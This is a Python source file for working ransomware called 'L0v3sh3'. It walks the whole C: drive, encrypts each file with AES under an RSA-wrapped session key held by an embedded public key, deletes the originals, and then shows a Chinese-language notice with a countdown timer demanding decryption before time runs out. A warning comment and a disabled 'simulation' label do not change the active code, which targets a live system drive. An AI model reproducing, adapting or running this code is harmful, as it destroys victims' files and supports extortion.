import base64
import os
import tkinter as tk
import datetime
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# public key with base64 encoding
pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2YVoxMmpBU2tZTkhSRXhGWGFKWQpackNSN1daZnBQeTRHNXVMazJId0NuTWpRTmxEclB4UzUwN2srU1ZTQnZVNVB1SENMc01PbEZGTUNBd2FyM2JXCjBuVkZpM1N6UjdQNk1EM3JRbzN2WFhWdTBOQ2NjUUdPT2dITUszNVNnUzc2QzM5a0xwTFZ3NS9tUVk5Tllsd28Ka2Y3NkR0Q2lTZWRaWDdUdjFpOUI1bTZWbWJYUDVuOElaTWFobkVHV1lMRTR5VlprMmRDRVlHSEdKRExjVWZzUwpadkhBMFBRbWpDeWxxYU53TnM0WitBcDJFbjM4MStyV1o2ZnN4WElxcEVTTlFncXhNVHFXdnJUaHdJb1E0c0VwCmVNODk1RzBjMi9COWpPS245YTAwNFhYbm1iMy9ZUS9URWJlMlBqa2VMYmwxaVgwTzVQanBZYmRJNEl1OWNMeisKcXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey = base64.b64decode(pubKey)

def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    try:
      for entry in os.scandir(baseDir):
          if entry.is_file():
              yield entry
          else:
              yield from scanRecurse(entry.path)
    except:
      print("FileNotFoundError")

def encrypt(dataFile, publicKey):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .L0v3sh3 and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    # convert data to bytes
    data = bytes(data)
    #print(extension)
    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)
    #print(sessionKey)
    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)
    #print(encryptedSessionKey)
    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    #print("dataFile:",dataFile)
    #print("extension",extension)
    fileName= dataFile.split('extension')[0]
    fileExtension = '.L0v3sh3'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)

def countdown(count):
    # change text in label
    # count = '01:30:00'
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        # call countdown again after 1000ms (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 

# change directory to the directory of the script
# keep secure of changing the directory,
# DONT RUN THIS SCRIPT ON YOUR PC
#directory = 'c:/tmp/' # CHANGE THIS
directory = 'C:/' # CHANGE THIS
excludeExtension = ['.py','.pem', '.exe', '.dll'] # CHANGE THIS
starttime=datetime.datetime.now()
for item in scanRecurse(directory):
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in excludeExtension:
        continue
    try:
      encrypt(filePath, pubKey)
    except:
      print("have error")

root = tk.Tk()
root.title('L0v3sh3 Ransomware')
root.geometry('500x300')
root.resizable(False, False)
#label1 = tk.Label(root, text='Your data is under rest, please don\'t pay me,\nthis just simulation !!\n\n', font=('calibri', 12,'bold'))
print(datetime.datetime.now())
endtime=datetime.datetime.now()

label1 = tk.Label(root, text=f'此電腦資料已於{starttime}開始加密，\n並於{endtime}被加密完成!\n\n請於計時器倒數結束前進行解密', font=('calibri', 12,'bold'))
label1.pack()
label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
label.pack()

# call countdown first time    
countdown('01:59:00')
# root.after(0, countdown, 5)
root.mainloop()